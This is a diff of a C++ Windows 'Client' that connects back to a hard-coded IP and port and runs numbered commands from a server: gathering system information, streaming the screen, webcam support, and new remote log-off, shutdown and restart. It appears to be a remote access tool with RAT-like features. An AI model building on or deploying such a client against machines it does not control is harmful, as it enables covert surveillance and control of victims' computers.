@@ -17,14 +17,15 @@
 #include "permission/Permission.h"
 #include "box_message/MessageBoxGUI.h"
 #include "screen/ScreenStreamer.h"
+#include "state/SystemState.h"
 
-#define IP "192.168.82.182"
+#define IP "192.168.1.133"
 
 #define PORT 3055
 
 #define TAG_NAME "Client"
 
-#define MUTEX "0e1bba6c-a3b5-4b3a-9bb5-32e68005b840"
+#define MUTEX "1b2f107d-215b-499b-8e94-b0dac486b511"
 
 #define TIMING_RETRY 10000
 
@@ -33,30 +34,6 @@
 #ifdef WEBCAM
 #include "webcam/WebcamManager.h"
 #endif
-
-
-
-// new comment 2
-// g++ Client.cpp  SystemInformation.cpp -o exec -lwsock32
-// g++ Client.cpp  SystemInformation.cpp -o exec -lwsock32 -lwininet
-// g++ Client.cpp  SystemInformation.cpp NetworkInformation.cpp -o exec
-// -lwsock32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic
-
-// final
-
-/* Without camera
- * g++  -I opencv/include  -L opencv/lib Client.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -lopencv_core460 -lopencv_videoio460 -lopencv_imgcodecs460 -lwsock32 -lWininet -lole32 -loleaut32 -o Client
- */
-
-/* With camera
- * g++ Client.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -IC:/opencv_static/mingw-build/install/include -LC:/opencv_static/mingw-build/install/x64/mingw/staticlib -lopencv_gapi460 -lopencv_highgui460 -lopencv_ml460 -lopencv_objdetect460 -lopencv_photo460 -lopencv_stitching460 -lopencv_video460 -lopencv_calib3d460 -lopencv_features2d460 -lopencv_dnn460 -lopencv_flann460 -lopencv_videoio460 -lopencv_imgcodecs460 -lopencv_imgproc460 -lopencv_core460 -llibprotobuf -lade -llibjpeg-turbo -llibwebp -llibpng -llibtiff -llibopenjp2 -lIlmImf -lzlib -lquirc -lwsock32 -lcomctl32 -lgdi32 -lole32 -lsetupapi -lws2_32  -loleaut32 -luuid -lcomdlg32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o exec
- *
- * Inside repository
- *  g++ Client.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -IC:opencv_static/include -Lopencv_static/lib -lopencv_gapi460 -lopencv_highgui460 -lopencv_ml460 -lopencv_objdetect460 -lopencv_photo460 -lopencv_stitching460 -lopencv_video460 -lopencv_calib3d460 -lopencv_features2d460 -lopencv_dnn460 -lopencv_flann460 -lopencv_videoio460 -lopencv_imgcodecs460 -lopencv_imgproc460 -lopencv_core460 -llibprotobuf -lade -llibjpeg-turbo -llibwebp -llibpng -llibtiff -llibopenjp2 -lIlmImf -lzlib -lquirc -lwsock32 -lcomctl32 -lgdi32 -lole32 -lsetupapi -lws2_32  -loleaut32 -luuid -lcomdlg32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o exec
- */
-
-
-
 
 int main() {
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
@@ -82,8 +59,14 @@ int main() {
                 while (streamListening) {
                     int action = stream.readSize();
                     switch (action) {
+                        case -2:{
+                            connectionState=false;
+                            streamListening=false;
+                            break;
+                        }
                         case -1:{
                             streamListening=false;
+                            break;
                         }
                         case 0: {
                             std::cout << "GATHERING SYSTEM INFORMATION" << std::endl;
@@ -286,8 +269,23 @@ int main() {
                             screenStreamer.sendPicture();
                             break;
                         }
+                        case 23: {
+                            std::cout << "LOG OFF" << std::endl;
+                            SystemState::setState(0);
+                            break;
+                        }
+                        case 24: {
+                            std::cout << "SHUTDOWN " << std::endl;
+                            SystemState::setState(1);
+                            break;
+                        }
+                        case 26: {
+                            std::cout << "RESTART " << std::endl;
+                            SystemState::setState(2);
+                            break;
+                        }
                         default: {
-                            streamListening = false;
+
                             break;
                         }
 
